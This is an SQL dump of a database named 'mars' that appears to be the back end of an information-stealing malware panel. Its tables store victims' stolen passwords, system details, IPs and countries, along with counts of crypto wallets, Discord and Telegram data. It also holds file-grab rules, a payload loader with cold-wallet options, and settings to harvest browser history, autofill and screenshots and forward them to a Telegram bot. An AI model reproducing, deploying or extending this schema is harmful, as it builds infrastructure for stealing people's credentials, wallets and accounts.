-- phpMyAdmin SQL Dump
-- version 4.9.5deb2
-- https://www.phpmyadmin.net/
--
-- Host: localhost
-- Generation Time: Dec 08, 2021 at 04:25 AM
-- Server version: 8.0.23-0ubuntu0.20.04.1
-- PHP Version: 7.4.3

SET SQL_MODE = "NO_AUTO_VALUE_ON_ZERO";
SET AUTOCOMMIT = 0;
START TRANSACTION;
SET time_zone = "+00:00";


/*!40101 SET @OLD_CHARACTER_SET_CLIENT=@@CHARACTER_SET_CLIENT */;
/*!40101 SET @OLD_CHARACTER_SET_RESULTS=@@CHARACTER_SET_RESULTS */;
/*!40101 SET @OLD_COLLATION_CONNECTION=@@COLLATION_CONNECTION */;
/*!40101 SET NAMES utf8mb4 */;

--
-- Database: `mars`
--

-- --------------------------------------------------------

--
-- Table structure for table `browsers`
--

CREATE TABLE `browsers` (
  `id` int NOT NULL,
  `name` varchar(60) NOT NULL,
  `count_c` int NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8;

--
-- Dumping data for table `browsers`
--

INSERT INTO `browsers` (`id`, `name`, `count_c`) VALUES
(1, 'Chromium', 0),
(2, 'Firefox', 0),
(3, 'IE', 0),
(4, 'Edge', 0),
(5, 'Opera', 0);

-- --------------------------------------------------------

--
-- Table structure for table `grabrule`
--

CREATE TABLE `grabrule` (
  `id` int NOT NULL,
  `name` varchar(45) DEFAULT NULL,
  `max_size` int DEFAULT NULL,
  `path` varchar(500) DEFAULT NULL,
  `formats` varchar(500) DEFAULT NULL,
  `blacklist` varchar(500) NOT NULL,
  `recursively` varchar(45) DEFAULT NULL,
  `compress` varchar(10) NOT NULL,
  `is_active` varchar(45) DEFAULT NULL,
  `id_user` tinyint UNSIGNED DEFAULT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8;

-- --------------------------------------------------------

--
-- Table structure for table `loader`
--

CREATE TABLE `loader` (
  `id` int NOT NULL,
  `name` varchar(45) NOT NULL,
  `load_to` varchar(120) DEFAULT NULL,
  `startup_param` varchar(120) DEFAULT NULL,
  `file_path` varchar(120) NOT NULL,
  `pwds` text,
  `is_active` varchar(10) NOT NULL,
  `cold_wallets` varchar(10) NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8;

-- --------------------------------------------------------

--
-- Table structure for table `log`
--

CREATE TABLE `log` (
  `id` int NOT NULL,
  `count_pwds` int DEFAULT NULL,
  `text_pwds` mediumtext,
  `text_sys` mediumtext,
  `ip` varchar(45) DEFAULT NULL,
  `country` varchar(45) DEFAULT NULL,
  `add_date` datetime DEFAULT NULL,
  `count_crpt` int DEFAULT NULL,
  `count_plugins` int DEFAULT NULL,
  `count_discord` int NOT NULL,
  `count_telegram` int NOT NULL,
  `path` text,
  `note` varchar(160) DEFAULT NULL,
  `id_machine` varchar(191) DEFAULT NULL,
  `dublicate` int NOT NULL,
  `tag` varchar(191) DEFAULT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8;

-- --------------------------------------------------------

--
-- Table structure for table `markerrule`
--

CREATE TABLE `markerrule` (
  `id` int NOT NULL,
  `name` varchar(45) NOT NULL,
  `marker` text NOT NULL,
  `color` varchar(30) NOT NULL,
  `is_active` varchar(45) NOT NULL,
  `id_user` tinyint UNSIGNED DEFAULT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8;

-- --------------------------------------------------------

--
-- Table structure for table `settings`
--

CREATE TABLE `settings` (
  `id` int NOT NULL,
  `dublicates` varchar(35) NOT NULL,
  `bot_enable` varchar(10) NOT NULL,
  `bot_token` varchar(100) NOT NULL,
  `bot_scr` varchar(10) NOT NULL,
  `chatid` varchar(100) NOT NULL,
  `grab_downloads` varchar(10) NOT NULL,
  `grab_history` varchar(10) NOT NULL,
  `grab_autofill` varchar(10) NOT NULL,
  `grab_screenshot` varchar(10) NOT NULL,
  `grab_discord` varchar(10) NOT NULL,
  `grab_telegram` varchar(10) NOT NULL,
  `logs_comment` varchar(10) NOT NULL,
  `logs_data` varchar(10) NOT NULL,
  `logs_marker` varchar(10) NOT NULL,
  `logs_ip` varchar(10) NOT NULL,
  `logs_screenshot` varchar(10) NOT NULL,
  `logs_actions` varchar(10) NOT NULL,
  `logs_date` varchar(10) NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8;

--
-- Dumping data for table `settings`
--

INSERT INTO `settings` (`id`, `dublicates`, `bot_enable`, `bot_token`, `bot_scr`, `chatid`, `grab_downloads`, `grab_history`, `grab_autofill`, `grab_screenshot`, `grab_discord`, `grab_telegram`, `logs_comment`, `logs_data`, `logs_marker`, `logs_ip`, `logs_screenshot`, `logs_actions`, `logs_date`) VALUES
(1, '1', '0', '', '0', '', '1', '1', '1', '1', '0', '0', '1', '1', '1', '1', '1', '1', '1');

-- --------------------------------------------------------

--
-- Table structure for table `statistics_countries`
--

CREATE TABLE `statistics_countries` (
  `id` int NOT NULL,
  `code` varchar(10) NOT NULL,
  `name` varchar(80) NOT NULL,
  `zone` varchar(15) NOT NULL,
  `count_c` int NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8;

--
-- Dumping data for table `statistics_countries`
--

INSERT INTO `statistics_countries` (`id`, `code`, `name`, `zone`, `count_c`) VALUES
(1, 'AF', 'Afghanistan', 'Asia', 0),
(2, 'AX', 'Åland Islands', 'Europe', 0),
(3, 'AL', 'Albania', 'Europe', 0),
(4, 'DZ', 'Algeria', 'Africa', 0),
(5, 'AS', 'American Samoa', 'Other', 0),
(6, 'AD', 'Andorra', 'Europe', 0),
(7, 'AO', 'Angola', 'Africa', 0),
(8, 'AI', 'Anguilla', 'Other', 0),
(9, 'AG', 'Antigua and Barbuda', 'Other', 0),
(10, 'AR', 'Argentina', 'Other', 0),
(11, 'AM', 'Armenia', 'Asia', 0),
(12, 'AW', 'Aruba', 'Other', 0),
(13, 'AU', 'Australia', 'Other', 0),
(14, 'AT', 'Austria', 'Europe', 0),
(15, 'BS', 'Bahamas', 'Other', 0),
(16, 'BH', 'Bahrain', 'Asia', 0),
(17, 'BD', 'Bangladesh', 'Asia', 0),
(18, 'BB', 'Barbados', 'Other', 0),
(19, 'BE', 'Belgium', 'Europe', 0),
(20, 'BZ', 'Belize', 'Other', 0),
(21, 'BJ', 'Benin', 'Africa', 0),
(22, 'BM', 'Bermuda', 'Other', 0),
(23, 'BT', 'Bhutan', 'Asia', 0),
(24, 'BO', 'Bolivia (Plurinational State of)', 'Other', 0),
(25, 'BQ', 'Bonaire, Sint Eustatius and Saba', 'Other', 0),
(26, 'BA', 'Bosnia and Herzegovina', 'Europe', 0),
(27, 'BW', 'Botswana', 'Africa', 0),
(28, 'BV', 'Bouvet Island', 'Other', 0),
(29, 'BR', 'Brazil', 'Other', 0),
(30, 'IO', 'British Indian Ocean Territory', 'Other', 0),
(31, 'BN', 'Brunei Darussalam', 'Asia', 0),
(32, 'BG', 'Bulgaria', 'Europe', 0),
(33, 'BF', 'Burkina Faso', 'Africa', 0),
(34, 'BI', 'Burundi', 'Other', 0),
(35, 'CV', 'Cabo Verde', 'Africa', 0),
(36, 'KH', 'Cambodia', 'Asia', 0),
(37, 'CM', 'Cameroon', 'Africa', 0),
(38, 'CA', 'Canada', 'Other', 0),
(39, 'KY', 'Cayman Islands', 'Other', 0),
(40, 'CF', 'Central African Republic', 'Africa', 0),
(41, 'TD', 'Chad', 'Africa', 0),
(42, 'CL', 'Chile', 'Other', 0),
(43, 'CN', 'China', 'Asia', 0),
(44, 'CX', 'Christmas Island', 'Asia', 0),
(45, 'CC', 'Cocos (Keeling) Islands', 'Other', 0),
(46, 'CO', 'Colombia', 'Other', 0),
(47, 'KM', 'Comoros', 'Africa', 0),
(48, 'CG', 'Congo (Republic of the)', 'Africa', 0),
(49, 'CD', 'Congo (Democratic Republic of the)', 'Africa', 0),
(50, 'CK', 'Cook Islands', 'Other', 0),
(51, 'CR', 'Costa Rica', 'Other', 0),
(52, 'CI', 'Côte d\'Ivoire', 'Other', 0),
(53, 'HR', 'Croatia', 'Europe', 0),
(54, 'CU', 'Cuba', 'Other', 0),
(55, 'CW', 'Curaçao', 'Other', 0),
(56, 'CY', 'Cyprus', 'Asia', 0),
(57, 'CZ', 'Czech Republic', 'Europe', 0),
(58, 'DK', 'Denmark', 'Europe', 0),
(59, 'DJ', 'Djibouti', 'Africa', 0),
(60, 'DM', 'Dominica', 'Other', 0),
(61, 'DO', 'Dominican Republic', 'Other', 0),
(62, 'EC', 'Ecuador', 'Other', 0),
(63, 'EG', 'Egypt', 'Africa', 0),
(64, 'SV', 'El Salvador', 'Other', 0),
(65, 'GQ', 'Equatorial Guinea', 'Africa', 0),
(66, 'ER', 'Eritrea', 'Africa', 0),
(67, 'EE', 'Estonia', 'Europe', 0),
(68, 'ET', 'Ethiopia', 'Africa', 0),
(69, 'FK', 'Falkland Islands (Malvinas)', 'Other', 0),
(70, 'FO', 'Faroe Islands', 'Europe', 0),
(71, 'FJ', 'Fiji', 'Other', 0),
(72, 'FI', 'Finland', 'Europe', 0),
(73, 'FR', 'France', 'Europe', 0),
(74, 'GF', 'French Guiana', 'Other', 0),
(75, 'PF', 'French Polynesia', 'Other', 0),
(76, 'TF', 'French Southern Territories', 'Other', 0),
(77, 'GA', 'Gabon', 'Africa', 0),
(78, 'GM', 'Gambia', 'Africa', 0),
(79, 'GE', 'Georgia', 'Asia', 0),
(80, 'DE', 'Germany', 'Europe', 0),
(81, 'GH', 'Ghana', 'Africa', 0),
(82, 'GI', 'Gibraltar', 'Europe', 0),
(83, 'GR', 'Greece', 'Europe', 0),
(84, 'GL', 'Greenland', 'Other', 0),
(85, 'GD', 'Grenada', 'Other', 0),
(86, 'GP', 'Guadeloupe', 'Other', 0),
(87, 'GU', 'Guam', 'Other', 0),
(88, 'GT', 'Guatemala', 'Other', 0),
(89, 'GG', 'Guernsey', 'Europe', 0),
(90, 'GN', 'Guinea', 'Africa', 0),
(91, 'GW', 'Guinea-Bissau', 'Africa', 0),
(92, 'GY', 'Guyana', 'Other', 0),
(93, 'HT', 'Haiti', 'Other', 0),
(94, 'HM', 'Heard Island and McDonald Islands', 'Other', 0),
(95, 'VA', 'Vatican City State', 'Europe', 0),
(96, 'HN', 'Honduras', 'Other', 0),
(97, 'HK', 'Hong Kong', 'Asia', 0),
(98, 'HU', 'Hungary', 'Europe', 0),
(99, 'IS', 'Iceland', 'Europe', 0),
(100, 'IN', 'India', 'Asia', 0),
(101, 'ID', 'Indonesia', 'Asia', 0),
(102, 'IR', 'Iran', 'Asia', 0),
(103, 'IQ', 'Iraq', 'Asia', 0),
(104, 'IE', 'Ireland', 'Europe', 0),
(105, 'IM', 'Isle of Man', 'Europe', 0),
(106, 'IL', 'Israel', 'Asia', 0),
(107, 'IT', 'Italy', 'Europe', 0),
(108, 'JM', 'Jamaica', 'Other', 0),
(109, 'JP', 'Japan', 'Asia', 0),
(110, 'JE', 'Jersey', 'Europe', 0),
(111, 'JO', 'Jordan', 'Asia', 0),
(112, 'KE', 'Kenya', 'Africa', 0),
(113, 'KI', 'Kiribati', 'Other', 0),
(114, 'KP', 'Korea (Democratic People\'s Republic of)', 'Asia', 0),
(115, 'KR', 'Korea (Republic of)', 'Asia', 0),
(116, 'KW', 'Kuwait', 'Asia', 0),
(117, 'KG', 'Kyrgyzstan', 'Asia', 0),
(118, 'LA', 'Lao People\'s Democratic Republic', 'Asia', 0),
(119, 'LV', 'Latvia', 'Europe', 0),
(120, 'LB', 'Lebanon', 'Asia', 0),
(121, 'LS', 'Lesotho', 'Africa', 0),
(122, 'LR', 'Liberia', 'Africa', 0),
(123, 'LY', 'Libya', 'Africa', 0),
(124, 'LI', 'Liechtenstein', 'Europe', 0),
(125, 'LT', 'Lithuania', 'Europe', 0),
(126, 'LU', 'Luxembourg', 'Europe', 0),
(127, 'MO', 'Macao', 'Asia', 0),
(128, 'MK', 'Macedonia', 'Europe', 0),
(129, 'MG', 'Madagascar', 'Africa', 0),
(130, 'MW', 'Malawi', 'Africa', 0),
(131, 'MY', 'Malaysia', 'Asia', 0),
(132, 'MV', 'Maldives', 'Asia', 0),
(133, 'ML', 'Mali', 'Africa', 0),
(134, 'MT', 'Malta', 'Europe', 0),
(135, 'MH', 'Marshall Islands', 'Other', 0),
(136, 'MQ', 'Martinique', 'Other', 0),
(137, 'MR', 'Mauritania', 'Africa', 0),
(138, 'MU', 'Mauritius', 'Africa', 0),
(139, 'YT', 'Mayotte', 'Africa', 0),
(140, 'MX', 'Mexico', 'Other', 0),
(141, 'FM', 'Micronesia (Federated States of)', 'Other', 0),
(142, 'MD', 'Moldova (Republic of)', 'Europe', 0),
(143, 'MC', 'Monaco', 'Europe', 0),
(144, 'MN', 'Mongolia', 'Asia', 0),
(145, 'ME', 'Montenegro', 'Europe', 0),
(146, 'MS', 'Montserrat', 'Other', 0),
(147, 'MA', 'Morocco', 'Africa', 0),
(148, 'MZ', 'Mozambique', 'Africa', 0),
(149, 'MM', 'Myanmar', 'Asia', 0),
(150, 'NA', 'Namibia', 'Africa', 0),
(151, 'NR', 'Nauru', 'Other', 0),
(152, 'NP', 'Nepal', 'Asia', 0),
(153, 'NL', 'Netherlands', 'Europe', 0),
(154, 'NC', 'New Caledonia', 'Other', 0),
(155, 'NZ', 'New Zealand', 'Other', 0),
(156, 'NI', 'Nicaragua', 'Other', 0),
(157, 'NE', 'Niger', 'Africa', 0),
(158, 'NG', 'Nigeria', 'Africa', 0),
(159, 'NU', 'Niue', 'Other', 0),
(160, 'NF', 'Norfolk Island', 'Other', 0),
(161, 'MP', 'Northern Mariana Islands', 'Other', 0),
(162, 'NO', 'Norway', 'Europe', 0),
(163, 'OM', 'Oman', 'Asia', 0),
(164, 'PK', 'Pakistan', 'Asia', 0),
(165, 'PW', 'Palau', 'Other', 0),
(166, 'PS', 'Palestine, State of', 'Asia', 0),
(167, 'PA', 'Panama', 'Other', 0),
(168, 'PG', 'Papua New Guinea', 'Other', 0),
(169, 'PY', 'Paraguay', 'Other', 0),
(170, 'PE', 'Peru', 'Other', 0),
(171, 'PH', 'Philippines', 'Asia', 0),
(172, 'PN', 'Pitcairn', 'Other', 0),
(173, 'PL', 'Poland', 'Europe', 0),
(174, 'PT', 'Portugal', 'Europe', 0),
(175, 'PR', 'Puerto Rico', 'Other', 0),
(176, 'QA', 'Qatar', 'Asia', 0),
(177, 'RE', 'Réunion', 'Africa', 0),
(178, 'RO', 'Romania', 'Europe', 0),
(179, 'RW', 'Rwanda', 'Africa', 0),
(180, 'BL', 'Saint Barthélemy', 'Other', 0),
(181, 'SH', 'Saint Helena', 'Africa', 0),
(182, 'KN', 'Saint Kitts and Nevis', 'Other', 0),
(183, 'LC', 'Saint Lucia', 'Other', 0),
(184, 'MF', 'Saint Martin (French part)', 'Other', 0),
(185, 'PM', 'Saint Pierre and Miquelon', 'Other', 0),
(186, 'VC', 'Saint Vincent and the Grenadines', 'Other', 0),
(187, 'WS', 'Samoa', 'Other', 0),
(188, 'SM', 'San Marino', 'Europe', 0),
(189, 'ST', 'Sao Tome and Principe', 'Africa', 0),
(190, 'SA', 'Saudi Arabia', 'Asia', 0),
(191, 'SN', 'Senegal', 'Africa', 0),
(192, 'RS', 'Serbia', 'Europe', 0),
(193, 'SC', 'Seychelles', 'Africa', 0),
(194, 'SL', 'Sierra Leone', 'Asia', 0),
(195, 'SG', 'Singapore', 'Asia', 0),
(196, 'SX', 'Sint Maarten (Dutch part)', 'Other', 0),
(197, 'SK', 'Slovakia', 'Europe', 0),
(198, 'SI', 'Slovenia', 'Europe', 0),
(199, 'SB', 'Solomon Islands', 'Other', 0),
(200, 'SO', 'Somalia', 'Africa', 0),
(201, 'ZA', 'South Africa', 'Africa', 0),
(202, 'GS', 'South Georgia', 'Other', 0),
(203, 'SS', 'South Sudan', 'Africa', 0),
(204, 'ES', 'Spain', 'Europe', 0),
(205, 'LK', 'Sri Lanka', 'Asia', 0),
(206, 'SD', 'Sudan', 'Africa', 0),
(207, 'SR', 'Suriname', 'Other', 0),
(208, 'SJ', 'Svalbard and Jan Mayen', 'Europe', 0),
(209, 'SZ', 'Swaziland', 'Africa', 0),
(210, 'SE', 'Sweden', 'Europe', 0),
(211, 'CH', 'Switzerland', 'Europe', 0),
(212, 'SY', 'Syrian Arab Republic', 'Asia', 0),
(213, 'TW', 'Taiwan, Province of China', 'Asia', 0),
(214, 'TJ', 'Tajikistan', 'Asia', 0),
(215, 'TZ', 'Tanzania, United Republic of', 'Africa', 0),
(216, 'TH', 'Thailand', 'Asia', 0),
(217, 'TL', 'Timor-Leste', 'Asia', 0),
(218, 'TG', 'Togo', 'Africa', 0),
(219, 'TK', 'Tokelau', 'Other', 0),
(220, 'TO', 'Tonga', 'Other', 0),
(221, 'TT', 'Trinidad and Tobago', 'Other', 0),
(222, 'TN', 'Tunisia', 'Africa', 0),
(223, 'TR', 'Turkey', 'Asia', 0),
(224, 'TM', 'Turkmenistan', 'Asia', 0),
(225, 'TC', 'Turks and Caicos Islands', 'Other', 0),
(226, 'TV', 'Tuvalu', 'Other', 0),
(227, 'UG', 'Uganda', 'Africa', 0),
(228, 'AE', 'United Arab Emirates', 'Asia', 0),
(229, 'GB', 'United Kingdom', 'Europe', 0),
(230, 'UM', 'United States Minor Outlying Islands', 'Other', 0),
(231, 'US', 'United States of America', 'USA', 0),
(232, 'UY', 'Uruguay', 'Other', 0),
(233, 'VU', 'Vanuatu', 'Other', 0),
(234, 'VE', 'Venezuela (Bolivarian Republic of)', 'Other', 0),
(235, 'VN', 'Vietnam', 'Asia', 0),
(236, 'VG', 'Virgin Islands (British)', 'Other', 0),
(237, 'VI', 'Virgin Islands (U.S.)', 'Other', 0),
(238, 'WF', 'Wallis and Futuna', 'Other', 0),
(239, 'EH', 'Western Sahara', 'Africa', 0),
(240, 'YE', 'Yemen', 'Asia', 0),
(241, 'ZM', 'Zambia', 'Africa', 0),
(242, 'ZW', 'Zimbabwe', 'Africa', 0);

-- --------------------------------------------------------

--
-- Table structure for table `topsites`
--

CREATE TABLE `topsites` (
  `id` int NOT NULL,
  `url` varchar(80) NOT NULL,
  `count_r` int NOT NULL DEFAULT '0'
) ENGINE=InnoDB DEFAULT CHARSET=utf8;

--
-- Indexes for dumped tables
--

--
-- Indexes for table `browsers`
--
ALTER TABLE `browsers`
  ADD PRIMARY KEY (`id`);

--
-- Indexes for table `grabrule`
--
ALTER TABLE `grabrule`
  ADD PRIMARY KEY (`id`);

--
-- Indexes for table `loader`
--
ALTER TABLE `loader`
  ADD PRIMARY KEY (`id`);

--
-- Indexes for table `log`
--
ALTER TABLE `log`
  ADD PRIMARY KEY (`id`);

--
-- Indexes for table `markerrule`
--
ALTER TABLE `markerrule`
  ADD PRIMARY KEY (`id`),
  ADD UNIQUE KEY `id_UNIQUE` (`id`);

--
-- Indexes for table `settings`
--
ALTER TABLE `settings`
  ADD PRIMARY KEY (`id`);

--
-- Indexes for table `statistics_countries`
--
ALTER TABLE `statistics_countries`
  ADD PRIMARY KEY (`id`);

--
-- Indexes for table `topsites`
--
ALTER TABLE `topsites`
  ADD PRIMARY KEY (`id`);

--
-- AUTO_INCREMENT for dumped tables
--

--
-- AUTO_INCREMENT for table `browsers`
--
ALTER TABLE `browsers`
  MODIFY `id` int NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=6;

--
-- AUTO_INCREMENT for table `grabrule`
--
ALTER TABLE `grabrule`
  MODIFY `id` int NOT NULL AUTO_INCREMENT;

--
-- AUTO_INCREMENT for table `loader`
--
ALTER TABLE `loader`
  MODIFY `id` int NOT NULL AUTO_INCREMENT;

--
-- AUTO_INCREMENT for table `log`
--
ALTER TABLE `log`
  MODIFY `id` int NOT NULL AUTO_INCREMENT;

--
-- AUTO_INCREMENT for table `markerrule`
--
ALTER TABLE `markerrule`
  MODIFY `id` int NOT NULL AUTO_INCREMENT;

--
-- AUTO_INCREMENT for table `settings`
--
ALTER TABLE `settings`
  MODIFY `id` int NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=2;

--
-- AUTO_INCREMENT for table `statistics_countries`
--
ALTER TABLE `statistics_countries`
  MODIFY `id` int NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=243;

--
-- AUTO_INCREMENT for table `topsites`
--
ALTER TABLE `topsites`
  MODIFY `id` int NOT NULL AUTO_INCREMENT;
COMMIT;

/*!40101 SET CHARACTER_SET_CLIENT=@OLD_CHARACTER_SET_CLIENT */;
/*!40101 SET CHARACTER_SET_RESULTS=@OLD_CHARACTER_SET_RESULTS */;
/*!40101 SET COLLATION_CONNECTION=@OLD_COLLATION_CONNECTION */;
